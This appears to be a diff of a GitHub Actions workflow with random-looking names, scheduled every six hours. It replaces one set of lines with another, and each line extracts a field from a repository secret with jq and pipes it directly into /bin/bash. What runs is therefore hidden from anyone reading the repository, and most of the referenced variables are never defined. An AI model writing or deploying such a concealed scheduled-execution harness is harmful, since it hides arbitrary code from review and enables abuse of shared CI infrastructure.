@@ -1,30 +1,22 @@
 name: careenmutter
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '1 5/6 * * *'
-jobs:  # 3880
+    - cron: '11 3/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: careenmutter
         env:
-          soy1891: ${{ secrets.soy1891 }}
+          b58202: ${{ secrets.b58202 }}
         run: |
-          echo $soy1891 | jq -r .l0955 | /bin/bash
-          echo $ljmq7 | jq -r .gyu59751 | /bin/bash
-          echo $ll414 | jq -r .rnvn802 | /bin/bash
-          echo $o587 | jq -r .p94 | /bin/bash
-          echo $uy94677 | jq -r .cwm14499 | /bin/bash
-          echo $wui58 | jq -r .bl1113 | /bin/bash
-          echo $s0338 | jq -r .rf77807 | /bin/bash
-          echo $pgp565 | jq -r .s40953 | /bin/bash
-          echo $dnr0392 | jq -r .v7880 | /bin/bash
-          echo $fh38676 | jq -r .eh85490 | /bin/bash
-          echo $wnwp8991 | jq -r .nic01734 | /bin/bash
-          echo $dzjl033 | jq -r .us131 | /bin/bash
-          echo $t2 | jq -r .om4672 | /bin/bash
-          echo $ek42 | jq -r .h977 | /bin/bash
+          echo $b58202 | jq -r .ni904 | /bin/bash
+          echo $bjkjh1213 | jq -r .lsv6 | /bin/bash
+          echo $qm7 | jq -r .pzrm485 | /bin/bash
+          echo $baynh89108 | jq -r .f10 | /bin/bash
+          echo $erm46 | jq -r .ey5 | /bin/bash
 
